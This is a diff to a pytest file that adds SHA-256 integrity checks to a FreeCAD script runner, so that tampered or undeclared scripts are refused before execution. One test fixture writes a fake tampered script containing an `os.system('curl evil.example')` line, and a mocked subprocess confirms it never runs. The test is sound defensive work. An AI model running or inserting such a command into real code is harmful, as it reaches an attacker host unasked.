@@ -2,16 +2,29 @@ from __future__ import annotations
 
 import ast
 from pathlib import Path
+import hashlib
 import subprocess
 
 import pytest
 
 from mech_cad_design_agent.freecad_runner import (
     FreeCADExecutableTrustError,
+    FreeCADScriptTrustError,
     _strip_freecad_progress_output,
     run_freecad_script,
 )
+from mech_cad_design_agent.package_resources import (
+    PACKAGED_SCRIPT_DIGESTS,
+    freecad_scripts_directory,
+)
 from mech_cad_design_agent.secure_fs import read_managed_file, same_managed_path
+
+
+
+def _digest(path: Path) -> str:
+    """A synthetic test script is not in the packaged manifest, so it declares
+    its own digest the way any non-packaged script must."""
+    return hashlib.sha256(path.read_bytes()).hexdigest()
 
 
 def test_runner_scrubs_environment_and_isolates_process_inside_attempt(
@@ -42,6 +55,7 @@ def test_runner_scrubs_environment_and_isolates_process_inside_attempt(
         expected_sha256=pinned.sha256,
         expected_identity=pinned.identity,
         controlled_directory=attempt,
+        expected_script_sha256=_digest(script),
     )
 
     environment = captured["env"]
@@ -84,6 +98,7 @@ def test_runner_uses_noninteractive_console_argument_and_closed_stdin(
         expected_sha256=pinned.sha256,
         expected_identity=pinned.identity,
         controlled_directory=attempt,
+        expected_script_sha256=_digest(script),
     )
 
     invocation = captured["args"]
@@ -195,4 +210,85 @@ def test_runner_rejects_substituted_executable_after_invocation(
             expected_sha256=pinned.sha256,
             expected_identity=pinned.identity,
             controlled_directory=attempt,
+            expected_script_sha256=_digest(script),
         )
+
+
+def test_a_tampered_packaged_script_is_refused_before_freecad_is_invoked(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """The executable was pinned twice a run and the code it ran not at all.
+
+    A packaged script is now checked against the manifest in package_resources,
+    so editing one on disk stops it being executed rather than being executed
+    silently.
+    """
+    attempt = tmp_path / "attempt"
+    attempt.mkdir()
+    executable = tmp_path / "freecadcmd"
+    executable.write_bytes(b"#!/bin/sh\n")
+    pinned = read_managed_file(executable)
+
+    tampered = tmp_path / "create_empty_model.py"
+    tampered.write_text("import os\nos.system('curl evil.example')\n", encoding="utf-8")
+
+    invoked = False
+
+    def fake_run(*args: object, **kwargs: object) -> subprocess.CompletedProcess[str]:
+        nonlocal invoked
+        invoked = True
+        return subprocess.CompletedProcess([], 0, "", "")
+
+    monkeypatch.setattr(subprocess, "run", fake_run)
+
+    with pytest.raises(FreeCADScriptTrustError, match="reviewed SHA-256"):
+        run_freecad_script(
+            executable,
+            tampered,
+            [],
+            timeout_seconds=3,
+            expected_sha256=pinned.sha256,
+            expected_identity=pinned.identity,
+            controlled_directory=attempt,
+        )
+    assert invoked is False
+
+
+def test_an_unknown_script_must_declare_its_digest(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """Running an unreviewed script stays possible and stops being accidental."""
+    attempt = tmp_path / "attempt"
+    attempt.mkdir()
+    executable = tmp_path / "freecadcmd"
+    executable.write_bytes(b"#!/bin/sh\n")
+    pinned = read_managed_file(executable)
+    script = tmp_path / "ad_hoc.py"
+    script.write_text("pass\n", encoding="utf-8")
+
+    monkeypatch.setattr(
+        subprocess,
+        "run",
+        lambda *a, **k: subprocess.CompletedProcess([], 0, "", ""),
+    )
+    common = dict(
+        timeout_seconds=3,
+        expected_sha256=pinned.sha256,
+        expected_identity=pinned.identity,
+        controlled_directory=attempt,
+    )
+
+    with pytest.raises(FreeCADScriptTrustError, match="not a packaged script"):
+        run_freecad_script(executable, script, [], **common)
+
+    run_freecad_script(
+        executable, script, [], expected_script_sha256=_digest(script), **common
+    )
+
+
+def test_every_packaged_script_matches_the_manifest_the_runner_enforces() -> None:
+    """The manifest and the files on disk must agree, or nothing can run."""
+    with freecad_scripts_directory() as scripts:
+        for name, expected in PACKAGED_SCRIPT_DIGESTS.items():
+            actual = hashlib.sha256((scripts / name).read_bytes()).hexdigest()
+            assert actual == expected, name
